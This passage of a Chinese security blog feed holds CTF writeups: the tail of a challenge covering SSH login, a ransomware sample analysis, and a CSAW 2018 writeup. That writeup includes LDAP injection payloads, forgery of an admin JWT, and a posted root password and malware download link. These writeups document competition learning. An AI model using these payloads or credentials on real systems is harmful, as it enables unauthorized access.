alt="1537979226469"></p><p>好的，我们现在得到了<code>*mGX3Y-d</code>。再仔细看看题目还有个神秘代码，<code>UJxgqdNUuH2I5EDDXgXvhFleJiVxeOvZBLXiLJ3lTq+lTRg7eSMR4++CZwe2z7vFh5CqETYeoZ7fAUWT4iCMMuap2iG/OfbKV2JN2SFrpCKCmSfnlxKIF02KTUyI99Ip/06LtNlmAIBtWisi0Ijr67lq+2HKQgxu5KaaNQpzohk=</code></p><p>这个通过之前压缩包中的<code>rsa</code>私钥文件直接解密，会得到以下内容<code>eK8}vD3=</code>。</p><p>好的做到这里，我有话要讲，那个时候，再看了下题目</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537979709788.png" alt="1537979709788"></p><p>再联系上面得到的消息，我用<code>ubuntu</code>的<code>ssh</code>服务尝试爆破了<code>207.148.27.120</code>的<code>22</code>端口，其中爆破字典我选择了<code>top</code>前<code>100</code>的弱密码，并且添加了<code>*mGX3Y-deK8}vD3=</code>、<code>eK8}vD3=*mGX3Y-d</code>这两个密码进去，但是爆破没结果。而真相是，过了一天，我用<code>xshell</code>再次连接时，直接<code>root</code>用户，再以<code>eK8}vD3=*mGX3Y-d</code>登进去了，登进去了。（这里之前问了出题老哥，老哥说设置了<code>ssh</code>验证次数为<code>5</code>次，猜测是不是这个原因导致<code>ubuntu</code>的<code>hydra</code>没有成功爆破）</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537882454775.png" alt="1537882454775"></p><p>密码是<code>eK8}vD3=*mGX3Y-d</code></p><p>登录成功后，第一件事就是查看<code>history</code>，还是发现了一些东西，比如说<code>icmpsh_m.py</code>，刚开始以为这个是<code>linux</code>提权的后门，理直气壮去找老哥，老哥说不是这个。好吧继续找。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537884117551.png" alt="1537884117551"></p><p>然后往下翻翻看到了这个</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537980328352.png" alt="1537980328352"></p><p>有个很明显的目录<code>/etc/ssh/</code>，下载了个<code>XAZLER.exe</code></p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537978124473.png" alt="1537978124473"></p><p>打开后是这样的</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537980446285.png" alt="1537980446285"></p><p>细心的你们一定发现，上面有提示“请按任意键继续”，嗯，但是我没按，直接关掉了（那个时候我只要多按下任意一个键，<code>key</code>就会出来）。然后我又继续往下探索，发现了存在一个<code>C3A37087469</code>的用户，咦！</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537886964567.png" alt="1537886964567"></p><p>其中有个<code>key.sh</code>，打开看下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#@Cherishao </span><br><span class="line"></span><br><span class="line">echo “Good job!!&quot;</span><br><span class="line"></span><br><span class="line">:) Congratulations, you have come here. </span><br><span class="line"></span><br><span class="line">   However, you need a higher level of permissions！！！</span><br><span class="line"></span><br><span class="line">   It is said that higher privilege passwords are more complicated(16bit).</span><br></pre></td></tr></table></figure><p>到这里，想了好久还是没思路，厚着脸皮去问出题老哥，发了一些解题截图过去，老哥说：“你是不是傻啊，再随便按个键啊”，然后就是下面这个样子（<code>tm</code>内心一万匹草泥马飞奔）</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537886544690.png" alt="1537886544690"></p><p>好吧，得到了<code>key</code>，下一关的钥匙。</p><p>在其中的解题过程中，此题的出题老哥，教了我好些应急响应、溯源等知识，贼喜欢。</p><p>这里放个学习链接：<a href="https://www.leiphone.com/news/201706/oCidY2C8IPHt82mF.html" target="_blank" rel="noopener">干货 | 黑客入侵？这里有详细的应急排查手册！</a></p><p>解题过程中，老哥为了加快我们的解题速度，还放出了个提示：</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537887293053.png" alt="1537887293053"></p><p>后面做完题，感觉这提示没啥用啊。后面问了下</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537981121231.png" alt="1537981121231"></p><p>好吧，的确有这样的想法，当时我记得<code>ip</code>反查都试了一遍。</p><h4 id="Level-5"><a href="#Level-5" class="headerlink" title="Level_5"></a>Level_5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">恭喜完成第四关，第五关是一个病毒分析题，样本下载地址：</span><br><span class="line"></span><br><span class="line">https://pan.baidu.com/s/1mngKICMpg4nSekfBp0qpPw        密码：fbox</span><br><span class="line"></span><br><span class="line">本题有两个问题：</span><br><span class="line"></span><br><span class="line">1：RSA公钥是什么？</span><br><span class="line"></span><br><span class="line">2: 黑客服务器的IP地址是什么？</span><br></pre></td></tr></table></figure><p>这题啊，大家解压压缩包的时候千万小心，这是个真的病毒，嗯~，还好我放在虚拟机里了，不然，物理机得遭殃。</p><p>看到了题目，想了想，有点意思啊，还问<code>黑客服务器的IP地址是什么？</code>。玩玩呗，虚拟机运行下这个病毒软件，发现文件数据被加密了，还发现了这个</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537981472145.png" alt="1537981472145"></p><p>然后我就去下载<code>onion</code>浏览器了，弄了半天没弄好，去问出题老哥，我觉得那个时候老哥都被我逗笑了。</p><p>然后老哥给了提示，抓包，这个其实也想到了，但是想归想到，操作起来发现巨坑，因为病毒传送信息的服务器炸了，导致抓包的时候没有看到<code>http</code>流，后面仔细看了半天，才找到下图的线索。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537954753559.png" alt="1537954753559"></p><p>是的，黑客服务器的IP地址就是<code>137.74.163.43</code>，就是这么简单。但是让我头疼的是第一个问题，<code>rsa</code>的公钥是啥？我滴个天啊，摆明要逆向啊。去问问出题老哥有没其他做法，老哥指点了一条明路：<strong>内存提串</strong>，后面使用了<code>火绒剑</code>，这个工具，贼好用。仔细分析了很久，火绒剑监控一下，就能看到这个病毒<code>exe</code>相应的行为了，在其运行完毕后，最终还会释放一个<code>PE</code>，而这个<code>PE</code>是没有任何混淆的，可以清晰使用<code>IDA</code>查看到其中的<code>RSA</code>公钥。当然其中需要<code>dump</code>一下，这里请教了下出题老哥：<strong><code>OD</code>本身能<code>dump</code>，<code>PEtoolS</code>，<code>loadPE</code>也都能dump。</strong>好吧，那就<code>dump</code>一下，<code>dump</code>出来后，直接扔到<code>IDA</code>中，得到<code>RSA</code>公钥</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537963593632.png" alt="1537963593632"></p><p>得到的最后<code>RSA</code>公钥为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyvXYYjSQqu7nWxB8HH/9SIaTd ZZ5Es9nv2KQnPcUV6F0ZHITClTZvoa7PbtG77q76xBNdvTH8VIXGjn+d58xK8jlE krC/N87iWPpG0jgmeY/ytR/gyArojmDFFnt11WP2koi2sjWzz1UXv8SC/aHHqfHe wgWrhFLmlhxrBxo46wIDAQAB -----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>黑客服务器<code>ip：137.74.163.43</code></p><p>这里有个尴尬的地方，因为我是先拿到<code>ip</code>，提交答案后，直接“完成所有挑战”，后面跟出题老哥反映下，再继续去找公钥的答案。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537978300052.png" alt="1537978300052"></p><p>到此结束，大佬们，再见。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;拿了首届信安之路巅峰挑战赛第一，这次比赛的&lt;code&gt;writeup&lt;/code&gt;如下，&lt;code&gt;orz&lt;/code&gt;，&lt;code&gt;orz&lt;/code&gt;。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://jianghuxia.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018中秋节随记</title>
    <link href="https://jianghuxia.github.io/2018/09/24/2018%E4%B8%AD%E7%A7%8B%E8%8A%82%E9%9A%8F%E8%AE%B0/"/>
    <id>https://jianghuxia.github.io/2018/09/24/2018中秋节随记/</id>
    <published>2018-09-24T13:18:59.000Z</published>
    <updated>2018-09-24T13:44:36.171Z</updated>
    
    <content type="html"><![CDATA[<p>今天中秋节，祝大佬们开开心心，阖家幸福，一首穷开心，祝大家天天开开心心，每天都是双倍的开心。</p><a id="more"></a> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=460315810&auto=1&height=66"></iframe><p>给大佬们递月饼</p><p><img src="http://www.hinews.cn/pic/003/018/766/00301876635_81ca3222.jpg" alt="img"></p><p>中秋，快乐，晚安！</p><p><img src="http://imgtianqi.eastday.com/res/upload/ue/image/20180919/1537339676661267.png" alt="2018éåä¸­ç§èæè¯µçè¯æ­ ä¸­ç§èå¤è¯è¯åå¥å¤§å¨è´ºå¡ç¥ç¦è¯­"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天中秋节，祝大佬们开开心心，阖家幸福，一首穷开心，祝大家天天开开心心，每天都是双倍的开心。&lt;/p&gt;
    
    </summary>
    
    
      <category term="life" scheme="https://jianghuxia.github.io/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>CSAW CTF Qualification Round 2018 Writeup</title>
    <link href="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/"/>
    <id>https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/</id>
    <published>2018-09-24T07:33:44.000Z</published>
    <updated>2018-09-24T07:41:49.980Z</updated>
    
    <content type="html"><![CDATA[<p>这次的web做的贼舒服，难度高，学的东西特别多，贼虚服。最近不是懒，是真忙，17号的黑盾，前前后后忙了四天，<code>writeup</code>后面最近才补全，福州这个去了好多次的城市，感慨颇多啊。</p><a id="more"></a> <h4 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h4><h5 id="Ldab-ldab注入——还需理解学习"><a href="#Ldab-ldab注入——还需理解学习" class="headerlink" title="Ldab(ldab注入——还需理解学习)"></a>Ldab(ldab注入——还需理解学习)</h5><p><em>dab</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.chal.csaw.io:8080</span><br></pre></td></tr></table></figure><p>这题，额，不难啊，之前noxctf做过一题<code>ldab</code>注入的题目<code>Dictionary of obscure sorrows</code>，大体类似。</p><p>刚开始做的时候，没注意到<code>ldab</code>，发现<code>sql</code>注入无果，后面还是看到OU、CN、SN、GivenName、UID，才反应过来。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537272110586.png" alt="1537272110586"></p><p>测试一波，发现Flag就是查不到，猜测后台过滤语句为：</p><p><code>&quot;(&amp;(GivenName=&quot; + $_GET[&#39;search&#39;] + &quot;)(GivenName!=Flag))&quot;</code></p><p>因此构造语句<code>$_GET[&#39;search&#39;]</code>=<code>&quot;Flag))(|(GivenName=*&quot;</code>，使得<code>&quot;(&amp;(GivenName=Flag))(|(GivenName=*&quot;)(GivenName!=Flag))&quot;</code>为永真条件即可。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537272522589.png" alt="1537272522589"></p><p>不过，后面发现构造<code>*)(uid=*))(|(uid=*</code>也是可以的。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537272844469.png" alt="1537272844469"></p><h5 id="sso（篡改Token——还需理解学习）"><a href="#sso（篡改Token——还需理解学习）" class="headerlink" title="sso（篡改Token——还需理解学习）"></a>sso（篡改Token——还需理解学习）</h5><p><code>Don&#39;t you love undocumented APIs</code></p><p><code>Be the admin you were always meant to be</code></p><p><code>http://web.chal.csaw.io:9000</code></p><p><code>Update chal description at: 4:38 to include solve details</code></p><p><code>Aesthetic update for chal at Sun 7:25 AM</code></p><p>打开网页，查看源代码</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537273716451.png" alt="1537273716451"></p><p>尝试访问<code>http://web.chal.csaw.io:9000/protected</code>，回显<code>Missing header: Authorization</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274035389.png" alt="1537274035389"></p><p>尝试访问<code>/oauth2/token</code>，回显<code>Not Found</code>，尝试提交空post数据，弹出<code>incorrect grant_type</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274187039.png" alt="1537274187039"></p><p>尝试访问<code>oauth2/authorize</code>，回显是<code>Not Found</code>，尝试提交空post数据，弹出<code>response_type not code</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537273623996.png" alt="1537273623996"></p><p>也就是说两个提示<code>post</code>请求方式的<code>url</code>还是缺少其他参数才能得到我们想要的回显，但是我不知道要提交啥头啊。后面做了其他题回头再看，看到<code>Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!</code>，搜索了下<code>OAUTH2.0</code>，果然找到了一些相关的<code>rfc</code>文档—— <a href="https://tools.ietf.org/html/rfc6750" target="_blank" rel="noopener">RFC-6750</a>和 <a href="https://tools.ietf.org/html/rfc6749" target="_blank" rel="noopener">RFC-6749</a> （或者<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">这个</a>）</p><p>其中<code>rfc6749</code>有这么一个说明，好像懂了啥</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274553787.png" alt="1537274553787"></p><p>后面构造<code>oauth2/authorize</code>的<code>post</code>数据<code>response_type=code&amp;redirect_uri=http://web.chal.csaw.io:9000/protected</code>，发现有个<code>302</code>的跳转</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537278198873.png" alt="1537278198873"></p><p>也就是这些内容</p><p><code>Redirecting to &lt;a href=&quot;http://web.chal.csaw.io:9000/protected?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzNzI3OTM0NSwiZXhwIjoxNTM3Mjc5OTQ1fQ.UCPeORGG0TCTiwLQznOOwwE3LTJEejZxqHKcZSYJN5s&amp;amp;state=&quot;&gt;http://web.chal.csaw.io:9000/protected?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzNzI3OTM0NSwiZXhwIjoxNTM3Mjc5OTQ1fQ.UCPeORGG0TCTiwLQznOOwwE3LTJEejZxqHKcZSYJN5s&amp;amp;state=&lt;/a&gt;.</code></p><p>打开<code>http://web.chal.csaw.io:9000/protected?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzNzI3OTM0NSwiZXhwIjoxNTM3Mjc5OTQ1fQ.UCPeORGG0TCTiwLQznOOwwE3LTJEejZxqHKcZSYJN5s&amp;amp;state=</code>看看，发现回显还是<code>Missing header: Authorization</code></p><p>那很好，估计现在是<code>/oauth2/token</code>的问题了，其实思路很明确了，JWT伪造。</p><p>刚刚尝试访问<code>/oauth2/token</code>，回显<code>Not Found</code>，尝试提交空post数据，弹出<code>incorrect grant_type</code>，那么我们查查<code>grant_type</code>改改成啥玩意呢，在<code>rfc6749</code>中有以下内容</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537275650034.png" alt="1537275650034"></p><p>所以我们设置成<code>grant_type=authorization_code</code>，接着尝试构造<code>post</code>请求数据<code>grant_type=authorization_code&amp;redirect_uri=http://web.chal.csaw.io:9000/protected</code>，提交发现</p><p>回显是<code>Missing parameters</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537275905514.png" alt="1537275905514"></p><p>检查了下，发现少了个<code>code</code>，就是上上图的<code>grant_type</code>下面的<code>code</code>，我们先设置<code>code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzNzI3OTM0NSwiZXhwIjoxNTM3Mjc5OTQ1fQ.UCPeORGG0TCTiwLQznOOwwE3LTJEejZxqHKcZSYJN5s</code>，这个<code>code</code>其实就是上面<code>oauth2/authorize</code>的<code>post</code>请求得到的<code>302</code>的<code>code</code>。</p><p>最终构造的<code>post</code>数据为：</p><p><code>grant_type=authorization_code&amp;code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzNzI3OTM0NSwiZXhwIjoxNTM3Mjc5OTQ1fQ.UCPeORGG0TCTiwLQznOOwwE3LTJEejZxqHKcZSYJN5s&amp;redirect_uri=http://web.chal.csaw.io:9000/protected</code>，提交</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537279886433.png" alt="1537279886433"></p><p>得到以下数据</p><table><thead><tr><th>token_type</th><th>“Bearer”</th></tr></thead><tbody><tr><td>token</td><td>“eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzI3OTY4MSwiZXhwIjoxNTM3MjgwMjgxfQ.oKFQF_SrfU3DGfVlC43OuwVp6-ukTDTJVRqcc9BiRNM”</td></tr></tbody></table><p>很好，这下，我们可以看到回显了个用户<code>Bearer</code>的token，用下<code>https://jwt.io/</code>看下伪造新的<code>token</code>，我这里将<code>&quot;type&quot;:&quot;user&quot;</code>改成了<code>&quot;type&quot;:&quot;admin&quot;</code>,使用<code>ufoundme</code>为秘钥填充。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537279832302.png" alt="1537279832302"></p><p>按照上面的<code>jwt</code>构造的结果，将构造的<code>jwt</code>设置为<code>http://web.chal.csaw.io:9000/protected</code>的<code>Authorization</code>头，构造如下：</p><p><code>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzcyNzk2ODEsImV4cCI6MTUzNzI4MDI4MX0.tLN-8JMx_mbQ4cRK6l-1C5VBLPC66mYjJKJoUcDlDkA</code></p><p>得到<code>flag</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537280149668.png" alt="1537280149668"></p><p>，</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537279784379.png" alt="1537279784379"></p><p>最终答案：<code>flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}</code></p><p>后面还看了看其他大佬的做法，发现差不多，但是大佬们思路整理的很好，这是其中一个<a href="https://www.aperikube.fr/docs/csawquals_2018/sso/" target="_blank" rel="noopener">大佬整理的思路</a></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274637496.png" alt="1537274637496"></p><h5 id="Hacker-Movie-Club-Web-缓存中毒——还需理解学习"><a href="#Hacker-Movie-Club-Web-缓存中毒——还需理解学习" class="headerlink" title="Hacker Movie Club(Web 缓存中毒——还需理解学习)"></a>Hacker Movie Club(Web 缓存中毒——还需理解学习)</h5><p><code>Hacker movies are very popular, so we needed a site that we can scale. You better get started though, there are a lot of movies to watch.</code></p><p><code>Author: itszn (ret2 systems)</code></p><p><code>http://app.hm.vulnerable.services/</code></p><p>打开网页是这样子的</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537342809395.png" alt="1537342809395"></p><p>一脸蒙蔽，看下源代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">data-src</span>=<span class="string">"mustache.min.js"</span> <span class="attr">data-cdn</span>=<span class="string">"6564ab9906a6472e43d8ad5fa6449ead2b591b7d.hm.vulnerable.services"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">data-src</span>=<span class="string">"app.js"</span> <span class="attr">data-cdn</span>=<span class="string">"6564ab9906a6472e43d8ad5fa6449ead2b591b7d.hm.vulnerable.services"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">@import url('https://fonts.googleapis.com/css?family=Orbitron');</span></span><br><span class="line"><span class="undefined">.......//此处省略</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span>Loading..<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.loaded_recapcha = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.loaded_recapcha = <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.loaded_mustache = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.loaded_mustache = <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/cdn.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://www.google.com/recaptcha/api.js?onload=loaded_recapcha&amp;render=explicit'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中<code>/cdn.js</code>内容为下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> t <span class="keyword">of</span> <span class="built_in">document</span>.head.children) &#123;</span><br><span class="line">    <span class="keyword">if</span> (t.tagName !== <span class="string">'SCRIPT'</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">let</span> &#123; cdn, src &#125; = t.dataset;</span><br><span class="line">    <span class="keyword">if</span> (cdn === <span class="literal">undefined</span> || src === <span class="literal">undefined</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    fetch(<span class="string">`//<span class="subst">$&#123;cdn&#125;</span>/cdn/<span class="subst">$&#123;src&#125;</span>`</span>,&#123;</span><br><span class="line">        headers: &#123;</span><br><span class="line">            <span class="string">'X-Forwarded-Host'</span>:cdn</span><br><span class="line">        &#125;&#125;</span><br><span class="line">    ).then(<span class="function"><span class="params">r</span>=&gt;</span>r.blob()).then(<span class="function"><span class="params">b</span>=&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> u = URL.createObjectURL(b);</span><br><span class="line">        <span class="keyword">let</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        s.src = u;</span><br><span class="line">        <span class="built_in">document</span>.head.appendChild(s);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>https://www.google.com/recaptcha/api.js?onload=loaded_recapcha&amp;render=explicit</code>内容为下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* PLEASE DO NOT COPY AND PASTE THIS CODE. */</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> CFG = <span class="string">'___grecaptcha_cfg'</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">window</span>[CFG]) &#123;</span><br><span class="line">        <span class="built_in">window</span>[CFG] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> GR = <span class="string">'grecaptcha'</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">window</span>[GR]) &#123;</span><br><span class="line">        <span class="built_in">window</span>[GR] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">window</span>[GR].ready = <span class="built_in">window</span>[GR].ready ||</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123; (<span class="built_in">window</span>[CFG][<span class="string">'fns'</span>] = <span class="built_in">window</span>[CFG][<span class="string">'fns'</span>] || []).push(f);</span><br><span class="line">    &#125;; (<span class="built_in">window</span>[CFG][<span class="string">'render'</span>] = <span class="built_in">window</span>[CFG][<span class="string">'render'</span>] || []).push(<span class="string">'explicit'</span>); (<span class="built_in">window</span>[CFG][<span class="string">'onload'</span>] = <span class="built_in">window</span>[CFG][<span class="string">'onload'</span>] || []).push(<span class="string">'loaded_recapcha'</span>);</span><br><span class="line">    <span class="built_in">window</span>[<span class="string">'__google_recaptcha_client'</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">var</span> po = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    po.type = <span class="string">'text/javascript'</span>;</span><br><span class="line">    po.async = <span class="literal">true</span>;</span><br><span class="line">    po.src = <span class="string">'https://www.gstatic.com/recaptcha/api2/v1536705955372/recaptcha__zh_cn.js'</span>;</span><br><span class="line">    <span class="keyword">var</span> elem = <span class="built_in">document</span>.querySelector(<span class="string">'script[nonce]'</span>);</span><br><span class="line">    <span class="keyword">var</span> n = elem &amp;&amp; (elem[<span class="string">'nonce'</span>] || elem.getAttribute(<span class="string">'nonce'</span>));</span><br><span class="line">    <span class="keyword">if</span> (n) &#123;</span><br><span class="line">        po.setAttribute(<span class="string">'nonce'</span>, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'script'</span>)[<span class="number">0</span>];</span><br><span class="line">    s.parentNode.insertBefore(po, s);</span><br><span 